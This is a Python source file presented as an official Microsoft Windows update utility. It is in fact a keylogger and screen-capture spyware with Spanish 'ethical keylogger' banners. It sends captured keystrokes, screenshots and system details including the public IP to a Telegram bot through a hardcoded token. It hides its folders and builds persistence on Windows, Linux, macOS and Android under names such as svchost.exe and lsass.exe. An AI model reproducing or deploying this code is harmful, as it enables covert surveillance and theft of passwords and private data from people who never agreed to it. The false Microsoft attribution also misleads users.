# -*- coding: utf-8 -*-$

"""
Windows System Update Utility - Microsoft Corporation
Official Windows update and maintenance tool
Version: 10.0.19041.546
Copyright © 2023 Microsoft Corporation. All rights reserved.
"""

import os
import sys
import time
import threading
import platform
import subprocess
import shutil
import base64
import random
import logging
import requests
from logging.handlers import RotatingFileHandler
from datetime import datetime
from pynput.keyboard import Key, Listener
from kivy.app import App
from kivy.uix.label import Label

# ==================== CONFIGURACIÓN ÉTICA ====================$
MOSTRAR_CONSOLA = True
DESACTIVAR_ENVIO = False
DESACTIVAR_PERSISTENCIA = True
MODO_VERBOSE = True

if MOSTRAR_CONSOLA:
    print("🔐 KEYLOGGER ÉTICO - MODO CONTROLADO")
    print("📝 Fines educativos y de aprendizaje")
    print("⏹️  Para detener: Presiona ESC")
    print("=" * 50)

# ==================== SYSTEM DETECTION ====================$
SISTEMA = platform.system().lower()
ES_WIN = SISTEMA == 'windows'
ES_LIN = SISTEMA == 'linux'
ES_MAC = SISTEMA == 'darwin'
ES_AND = 'android' in SISTEMA
ES_IOS = 'ios' in SISTEMA

# ==================== CONDITIONAL IMPORTS ====================$
try:
    from pynput.keyboard import Key, Listener
    TECLADO_DISP = True
    if MODO_VERBOSE:
        print("✅ pynput importado correctamente")
except ImportError:
    TECLADO_DISP = False
    if MODO_VERBOSE:
        print("❌ pynput no disponible")

try:
    import pyautogui
    PANTALLA_DISP = True
    if MODO_VERBOSE:
        print("✅ pyautogui importado correctamente")
except ImportError:
    PANTALLA_DISP = False
    if MODO_VERBOSE:
        print("❌ pyautogui no disponible")

if ES_WIN:
    try:
        import win32api
        import win32con
        import win32gui
        import winreg
        WIN_API_DISP = True
        if MODO_VERBOSE:
            print("✅ win32api importado correctamente")
    except ImportError:
        WIN_API_DISP = False
        if MODO_VERBOSE:
            print("❌ win32api no disponible")
else:
    WIN_API_DISP = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CIFRADO_DISP = True
    if MODO_VERBOSE:
        print("✅ cryptography importado correctamente")
except ImportError:
    CIFRADO_DISP = False
    if MODO_VERBOSE:
        print("❌ cryptography no disponible")

# ==================== CONFIGURATION ====================$
TOKEN = '7843134567:AAERIl4NSsQNv65avHfWwXqjk1fuC0Me2is'  # Obtener de @BotFather
CHAT_ID = '5719356323'       # Obtener con @userinfobot

# Intervals (seconds)
INTERVALO_REPORTE = 10
INTERVALO_CAPTURAS = 10
MAX_LOG_SIZE = 3000

# Encryption settings
SALT = b'System_Update_Salt_456'
PASSWORD = b'WindowsUpdateSecurePassword456!'

# ==================== INITIALIZATION ====================$
def configurar_logging():
    try:
        if ES_WIN:
            log_dir = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Logs')
        elif ES_AND:
            log_dir = '/sdcard/Android/data/com.microsoft.windows.update/'
        elif ES_IOS:
            log_dir = os.path.expanduser('~/Documents/Windows/Logs')
        else:
            log_dir = os.path.expanduser('~/.microsoft/winupdate/logs')

        os.makedirs(log_dir, exist_ok=True)

        if ES_WIN and WIN_API_DISP:
            try:
                win32api.SetFileAttributes(log_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
            except:
                pass

        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                RotatingFileHandler(
                    os.path.join(log_dir, 'windows_update.log'),
                    maxBytes=100000,
                    backupCount=3
                )
            ]
        )
        if MODO_VERBOSE:
            print(f"📁 Logs guardados en: {log_dir}")
    except Exception as e:
        if MODO_VERBOSE:
            print(f"❌ Error configurando logging: {e}")

configurar_logging()

# Global variables
log = ""
detener = False

# ==================== ENCRYPTION FUNCTIONS ====================$
def generar_clave_cifrado():
    if not CIFRADO_DISP:
        return None

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=480000,
    )
    return base64.urlsafe_b64encode(kdf.derive(PASSWORD))

cipher_suite = Fernet(generar_clave_cifrado()) if CIFRADO_DISP else None

# ==================== PERSISTENCE ====================$
def establecer_persistencia():
    if DESACTIVAR_PERSISTENCIA:
        if MODO_VERBOSE:
            print("🛑 Persistencia DESACTIVADA")
        return

    try:
        if ES_WIN and WIN_API_DISP:
            _persistencia_windows()
        elif ES_LIN:
            _persistencia_linux()
        elif ES_MAC:
            _persistencia_mac()
        elif ES_AND:
            _persistencia_android()
        if MODO_VERBOSE:
            print("🔧 Persistencia configurada")
    except Exception as e:
        if MODO_VERBOSE:
            print(f"❌ Error persistencia: {e}")

def _persistencia_windows():
    try:
        ubicacion_actual = sys.executable if getattr(sys, 'frozen', False) else __file__

        directorio_oculto = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'System32_Backup')
        os.makedirs(directorio_oculto, exist_ok=True)
        win32api.SetFileAttributes(directorio_oculto, win32con.FILE_ATTRIBUTE_HIDDEN)

        nombre_exe = random.choice(['svchost.exe', 'lsass.exe', 'dllhost.exe'])
        destino = os.path.join(directorio_oculto, nombre_exe)

        if not os.path.exists(destino):
            shutil.copy2(ubicacion_actual, destino)

            ubicaciones_registro = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            ]

            for ubicacion in ubicaciones_registro:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, ubicacion, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, destino)
                    winreg.CloseKey(key)
                except:
                    continue
    except Exception:
        pass

def _persistencia_linux():
    try:
        service_content = f"""[Unit]
Description=Windows System Update
After=network.target

[Service]
ExecStart={sys.executable} {__file__}
Restart=always
User={os.getlogin()}

[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/windows-update.service"
        with open(service_path, 'w') as f:
            f.write(service_content)

        subprocess.run(['systemctl', 'enable', 'windows-update.service'], check=False)
    except Exception:
        pass

def _persistencia_android():
    try:
        if os.path.exists('/data/data/com.termux/files/home'):
            startup_script = """#!/bin/bash
python3 /sdcard/windows_update.py &
"""
            script_path = '/data/data/com.termux/files/home/.bashrc'
            with open(script_path, 'a') as f:
                f.write(startup_script)
    except Exception:
        pass

def _persistencia_mac():
    try:
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.microsoft.windows.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{__file__}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
        plist_path = os.path.expanduser('~/Library/LaunchAgents/com.microsoft.windows.update.plist')
        with open(plist_path, 'w') as f:
            f.write(plist_content)
    except Exception:
        pass

# ==================== CAPTURE FUNCTIONS ====================$
def on_press(key):
    global log, detener

    try:
        # Detener con ESC
        if key == Key.esc:
            detener = True
            if MOSTRAR_CONSOLA:
                print("\n🛑 ESC detectado - Deteniendo keylogger...")
            return False

        # Capturar teclas normales
        if hasattr(key, 'char') and key.char:
            log += key.char
            if MOSTRAR_CONSOLA and len(log) % 20 == 0:
                print(f"📝 Teclas capturadas: {len(log)} caracteres")
        else:
            log += f"[{str(key).replace('Key.', '')}] "

        if len(log) > MAX_LOG_SIZE:
            threading.Thread(target=enviar_log, daemon=True).start()

    except Exception as e:
        if MOSTRAR_CONSOLA:
            print(f"❌ Error en on_press: {e}")

def on_release(key):
    pass

def capturar_pantalla():
    try:
        if not PANTALLA_DISP:
            return None, "Display unavailable"

        if ES_WIN and WIN_API_DISP:
            try:
                ventana = win32gui.GetForegroundWindow()
                titulo = win32gui.GetWindowText(ventana)
                rect = win32gui.GetWindowRect(ventana)
                x, y, w, h = rect
                captura = pyautogui.screenshot(region=(x, y, w - x, h - y))
                return captura, titulo
            except:
                captura = pyautogui.screenshot()
                return captura, "Full screen"
        else:
            captura = pyautogui.screenshot()
            return captura, "Full screen"
    except Exception as e:
        if MOSTRAR_CONSOLA:
            print(f"❌ Error capturando pantalla: {e}")
        return None, "Error"

# ==================== COMMUNICATION FUNCTIONS ====================$
def enviar_log():
    global log
    try:
        if log and len(log) > 10:
            log_actual = log
            log = ""

            if CIFRADO_DISP and cipher_suite:
                log_actual = cipher_suite.encrypt(log_actual.encode()).decode()
                if MOSTRAR_CONSOLA:
                    print("🔒 Log cifrado")

            if MOSTRAR_CONSOLA:
                print(f"📤 Enviando {len(log_actual)} caracteres a Telegram...")

            enviar_a_telegram(f"⌨️ Keylog:\n{log_actual}")
        elif log:
            if MOSTRAR_CONSOLA:
                print(f"📝 Log pequeño ({len(log)} chars), acumulando...")
    except Exception as e:
        if MOSTRAR_CONSOLA:
            print(f"❌ Error en enviar_log: {e}")

def enviar_a_telegram(mensaje, archivo=None):
    try:
        if not TOKEN or not CHAT_ID:
            if MOSTRAR_CONSOLA:
                print("❌ Token o Chat ID faltante")
            return False

        url = f'https://api.telegram.org/bot{TOKEN}/'

        if archivo and os.path.exists(archivo):
            # Envío de archivo (captura de pantalla)
            with open(archivo, 'rb') as f:
                files = {'photo': f} if str(archivo).endswith(('.jpg', '.jpeg', '.png')) else {'document': f}
                method = 'sendPhoto' if str(archivo).endswith(('.jpg', '.jpeg', '.png')) else 'sendDocument'

                response = requests.post(
                    url + method,
                    data={'chat_id': CHAT_ID, 'caption': mensaje[:1000]},
                    files=files,
                    timeout=30
                )

            # Eliminar archivo después de enviar
            try:
                os.remove(archivo)
            except:
                pass

        else:
            # Envío de mensaje de texto
            response = requests.post(
                url + 'sendMessage',
                data={'chat_id': CHAT_ID, 'text': mensaje[:4000]},
                timeout=15
            )

        # Verificar respuesta
        if response.status_code == 200:
            if MOSTRAR_CONSOLA:
                print("✅ Mensaje enviado a Telegram")
            return True
        else:
            if MOSTRAR_CONSOLA:
                print(f"❌ Error Telegram: {response.status_code}")
                print(f"   Respuesta: {response.text}")
            return False

    except Exception as e:
        if MOSTRAR_CONSOLA:
            print(f"❌ Error enviando a Telegram: {e}")
        return False

# ==================== EXECUTION THREADS ====================$
def hilo_capturas():
    while not detener:
        try:
            if PANTALLA_DISP:
                captura, titulo = capturar_pantalla()
                if captura:
                    nombre = f"screen_{int(time.time())}.jpg"
                    captura.save(nombre, quality=70)
                    if MOSTRAR_CONSOLA:
                        print(f"📷 Captura guardada: {nombre}")
                    enviar_a_telegram(f"🖥️ {titulo}", nombre)
        except Exception as e:
            if MOSTRAR_CONSOLA:
                print(f"❌ Error en hilo_capturas: {e}")
            time.sleep(10)
        time.sleep(INTERVALO_CAPTURAS)

def hilo_reporte():
    while not detener:
        try:
            if log:
                enviar_log()
        except Exception as e:
            if MOSTRAR_CONSOLA:
                print(f"❌ Error en hilo_reporte: {e}")
        time.sleep(INTERVALO_REPORTE)

# ==================== SYSTEM INFORMATION ====================$
def capturar_info_sistema():
    try:
        info = {
            "Device": platform.node(),
            "System": platform.platform(),
            "Version": platform.version(),
            "Architecture": platform.machine(),
            "Processor": platform.processor() or "Unknown",
            "Date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        if ES_AND:
            info["Type"] = "Android"
        elif ES_IOS:
            info["Type"] = "iOS"
        elif ES_WIN:
            info["Type"] = "Windows"
        elif ES_LIN:
            info["Type"] = "Linux"
        elif ES_MAC:
            info["Type"] = "macOS"

        try:
            info["IP"] = requests.get('https://api.ipify.org', timeout=5).text
        except:
            info["IP"] = "Unavailable"

        return "\n".join(f"{k}: {v}" for k, v in info.items())
    except Exception as e:
        return f"System information: Error - {e}"

# ==================== MAIN EXECUTION ====================$
if __name__ == "__main__":
    try:
        if MOSTRAR_CONSOLA:
            print("✔️ Iniciando keylogger ético")
            print("📖 Capturando teclas y pantallas")
            print("🔴 Enviando a Telegram activado")
            print("📖 Para detener: Presiona ESC")
            print("=" * 58)

        logging.info(f"Windows Update Service starting on {SISTEMA}")

        establecer_persistencia()

        info_sistema = capturar_info_sistema()
        logging.info(f"System info: {info_sistema}")

        if MOSTRAR_CONSOLA:
            print(f"📖 Información del sistema:\n{info_sistema}")

        # Enviar info inicial a Telegram
        if TOKEN and CHAT_ID and not DESACTIVAR_ENVIO:
            enviar_a_telegram(f"✔️ Windows Update Service started on {SISTEMA}\n\n{info_sistema}")
            
        # Aquí debería continuar con el inicio del keylogger
        # Por ejemplo: iniciar_keylogger()
        
    except Exception as e:
        logging.error(f"Error inicial: {e}")
        if MOSTRAR_CONSOLA:
            print(f"❌ Error al iniciar: {e}")
        
        # Opcional: enviar error a Telegram
        if TOKEN and CHAT_ID and not DESACTIVAR_ENVIO:
            enviar_a_telegram(f"❌ Error al iniciar keylogger: {e}")



